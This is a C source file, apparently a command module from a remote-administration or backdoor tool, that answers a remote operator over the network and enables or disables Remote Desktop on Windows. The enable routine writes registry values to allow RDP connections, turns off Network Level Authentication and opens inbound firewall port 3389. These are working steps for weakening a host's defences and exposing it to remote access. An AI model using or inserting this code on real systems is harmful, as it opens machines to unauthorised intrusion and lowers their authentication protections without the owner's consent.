#include <stdio.h>

#include "firewall.h"
#include "registry.h"

#include "command.h"
#include "networking.h"
#include "process.h"
#include "rdp.h"
#include "utils.h"

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: RDP HELP ::.\n\n"
			L"Usage: rdp [help|enable|disable]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tEnables RDP.\n"
			L"\t%-12s:\tDisables RDP.\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_ENABLE,
			OPTION_STRING_DISABLE);
}

static void RdpNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", RDP_BANNER, szBuf);
}

// TODO Change all these to WinAPI functions instead of ShellExecuteEx.
BOOL RdpEnable(void) {
	// "Allow Remote Assitance connections to this computer"
	// HKLM\System\CurrentControlSet\Control\Remote Assistance\fAllowToGetHelp => 1
	if (RegistryAddDword(L"HKLM\\System\\CurrentControlSet\\Control\\Remote Assistance", L"fAllowToGetHelp", 1, TRUE) == 1) {
		RdpNetSend(L"Failed to set value fAllowToGetHelp.");
		return FALSE;
	}

	// "Allow connections from computers running any version of Remote Desktop (less secure)"
	// HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections => 0
	if (RegistryAddDword(L"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server", L"fDenyTSConnections", 0, TRUE) == 1) {
		RdpNetSend(L"Failed to set fDenyTSConnections.");
		return FALSE;
	}

	// Disable "Network Level Authentication"
	// HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\UserAuthentication => 0
	if (RegistryAddDword(L"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", L"UserAuthentication", 0, TRUE) == 1) {
		RdpNetSend(L"Failed to set UserAuthentication.");
		return FALSE;
	}

	if (FirewallAddRuleIn(RDP_FIREWALL_RULE_NAME, TRUE, 3389, TRUE) == 1) {
		RdpNetSend(L"Failed to add RDP firewall rule.");
		return FALSE;
	}

	return TRUE;
}

BOOL RdpDisable(void) {
	// "Allow connections from computers running any version of Remote Desktop (less secure)"
	// HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections => 1
	if (RegistryAddDword(L"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server", L"fDenyTSConnections", 1, TRUE) == 1) {
		RdpNetSend(L"Failed to set fDenyTSConnections.");
		return FALSE;
	}

	if (FirewallDeleteRule(RDP_FIREWALL_RULE_NAME) == 1) {
		RdpNetSend(L"Failed to delete RDP firewall rule.");
		return FALSE;
	}

	return TRUE;
}

ULONG RdpMain(INT argc, LPWSTR *argv) {
	if (argc < 2) {
		PrintHelp();
	} else {
		if (!_wcsnicmp(argv[1], OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
			PrintHelp();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_ENABLE, wcslen(OPTION_STRING_ENABLE))) {
			if (RdpEnable() == TRUE) {
				RdpNetSend(L"RDP is enabled.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_DISABLE, wcslen(OPTION_STRING_DISABLE))) {
			if (RdpDisable() == TRUE) {
				RdpNetSend(L"RDP is disabled.");
			}
		} else {
			RdpNetSend(L"Bad arguments.");
		}
	}

	return 0;
} 